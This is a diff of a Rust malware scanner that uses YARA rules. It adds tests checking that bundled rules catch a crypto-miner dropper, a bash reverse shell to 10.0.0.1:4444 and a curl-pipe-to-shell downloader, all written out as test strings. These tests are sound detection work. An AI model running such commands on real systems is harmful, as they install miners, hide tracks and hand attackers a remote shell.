@@ -18,7 +18,7 @@ use regex::Regex;
 use yara_x::{Compiler, MetaValue, Rules, Scanner};
 
 use super::{Match, Severity};
-use crate::config::{feeds_dir, BUNDLED_RULES_DIR};
+use crate::config::{bundled_rules_dir, feeds_dir};
 
 const SCAN_TIMEOUT: Duration = Duration::from_secs(5);
 
@@ -32,7 +32,7 @@ pub struct YaraRules {
 
 impl YaraRules {
     pub fn load_default() -> YaraRules {
-        let mut files: Vec<(PathBuf, bool)> = rule_files(Path::new(BUNDLED_RULES_DIR)).into_iter().map(|p| (p, true)).collect();
+        let mut files: Vec<(PathBuf, bool)> = rule_files(&bundled_rules_dir()).into_iter().map(|p| (p, true)).collect();
         // Development fallback: rules next to the source tree.
         if files.is_empty() {
             let dev = Path::new(concat!(env!("CARGO_MANIFEST_DIR"), "/rules"));
@@ -250,6 +250,43 @@ rule Linux_Hacktool_Socat { condition: elf.type == elf.ET_EXEC }
         assert!(!kept.contains("Linux_Module"), "ELF only mentioned in the description");
         assert!(!kept.contains("Win_Thing") && !kept.contains("Socat"));
         assert_eq!(sel.dropped, 3);
+    }
+
+    fn bundled() -> YaraRules {
+        let path = PathBuf::from(concat!(env!("CARGO_MANIFEST_DIR"), "/rules/qlam-linux.yar"));
+        YaraRules::load_files(&[(path, true)])
+    }
+
+    const DROPPER: &str = "wget http://1.2.3.4/xmrig -O /tmp/.x/k\npkill -9 -f kinsing\nchattr -i /etc/ld.so.preload\nhistory -c\n";
+
+    #[test]
+    fn bundled_script_rules_catch_real_scripts() {
+        let r = bundled();
+        let name = |data: &str| r.scan(data.as_bytes()).map(|m| m.name);
+        assert_eq!(name(&format!("#!/bin/bash\n{DROPPER}")).as_deref(), Some("Qlam.Linux.Miner.Dropper"));
+        assert_eq!(
+            name("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n").as_deref(),
+            Some("Qlam.Linux.HackTool.ReverseShell")
+        );
+        assert_eq!(
+            name("#!/bin/sh\ncurl -s http://1.2.3.4/a.sh | sh\n").as_deref(),
+            Some("Qlam.Linux.Downloader.PipeToShell")
+        );
+    }
+
+    /// Text that only mentions what the rules look for — Qlam's own rules and
+    /// sources (found in a real home scan, 2026-09-30), notes, docs — must
+    /// never be flagged.
+    #[test]
+    fn bundled_rules_ignore_text_that_quotes_them() {
+        let r = bundled();
+        for (what, data) in [
+            ("the rule file itself", include_str!("../../rules/qlam-linux.yar").to_string()),
+            ("persistence.rs", include_str!("../persistence.rs").to_string()),
+            ("a note", format!("# Incident notes\nThe attacker ran:\n{DROPPER}\ncurl -s http://1.2.3.4/a.sh | sh\n")),
+        ] {
+            assert!(r.scan(data.as_bytes()).is_none(), "{what} was flagged");
+        }
     }
 
     #[test]
